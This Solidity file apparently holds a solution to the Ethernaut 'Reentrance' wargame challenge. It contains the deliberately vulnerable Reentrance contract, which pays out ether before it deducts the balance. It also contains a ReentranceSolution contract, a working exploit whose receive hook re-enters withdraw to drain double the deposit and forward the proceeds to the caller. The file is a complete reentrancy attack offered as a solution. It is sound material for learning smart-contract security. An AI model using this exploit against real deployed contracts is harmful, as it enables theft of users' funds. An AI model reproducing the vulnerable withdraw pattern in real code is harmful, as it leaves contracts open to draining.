pragma solidity ^0.6.0;

import '@openzeppelin/contracts/math/SafeMath.sol';

contract Reentrance {
  
  using SafeMath for uint256;
  mapping(address => uint) public balances;

  function donate(address _to) public payable {
    balances[_to] = balances[_to].add(msg.value);
  }

  function balanceOf(address _who) public view returns (uint balance) {
    return balances[_who];
  }

  function withdraw(uint _amount) public {
    if(balances[msg.sender] >= _amount) {
      (bool result,) = msg.sender.call{value:_amount}("");
      if(result) {
        _amount;
      }
      balances[msg.sender] -= _amount;
    }
  }

  receive() external payable {}
}

contract ReentranceSolution {
    uint public donationAmount;
    bool doubleWithdraw;
    Reentrance challenge;

    constructor(address _challengeAddress) public {
        doubleWithdraw = false;
        challenge = Reentrance(payable(_challengeAddress));
    }

    function hack() external payable {
        // Start hacking
        require(address(challenge).balance == msg.value, "Incorrect input value");
        
        donationAmount = msg.value;
        challenge.donate{value: msg.value}(address(this));
        require(challenge.balanceOf(address(this)) == msg.value, "Bad donation");
        
        challenge.withdraw(msg.value);
        // Teardown
        require(address(this).balance == msg.value * 2, "Tally incorrect");
        (bool res,) = msg.sender.call{value: address(this).balance}("");
        require(res, "Can't teardown");
    }

    receive() external payable {
        if (!doubleWithdraw) {
            challenge.withdraw(donationAmount);

            doubleWithdraw = true;
        }
    }
}